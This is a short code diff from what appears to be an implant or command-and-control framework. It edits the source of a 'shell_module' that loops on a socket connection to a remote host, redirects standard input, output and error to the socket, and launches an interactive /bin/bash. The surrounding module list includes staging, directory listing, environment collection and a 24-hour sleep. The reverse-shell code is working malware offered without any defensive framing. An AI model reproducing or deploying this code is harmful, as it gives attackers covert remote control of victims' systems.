@@ -60,10 +60,10 @@ def run(**args):
     time.sleep(random.randint(86000,86800))
                         '''
         self.shell_module = '''
-from os import dup2
-from pty import spawn
-from time import sleep
-from random import randint
+import os
+import subprocess
+import time
+import random
 import socket
 
 
@@ -75,12 +75,12 @@ def run():
         try:
             s.connect((host,port))
         except:
-            sleep(randint(10,15))
+            time.sleep(random.randint(10,15))
             continue
-        dup2(s.fileno(),0) 
-        dup2(s.fileno(),1) 
-        dup2(s.fileno(),2)
-        spawn("/bin/bash")
+        os.dup2(s.fileno(),0) 
+        os.dup2(s.fileno(),1) 
+        os.dup2(s.fileno(),2)
+        subprocess.run(["/bin/bash","-i"])
     
 '''
         self.module_list = [('stage_1',self.stage_1), ('dir_lister',self.dir_lister), ('enviro',self.enviro), ('sleep',self.sleep), ('stage_2_qrw',self.stage_2_qrw), ('sleep24h',self.sleep24h), ('shell_module',self.shell_module)]
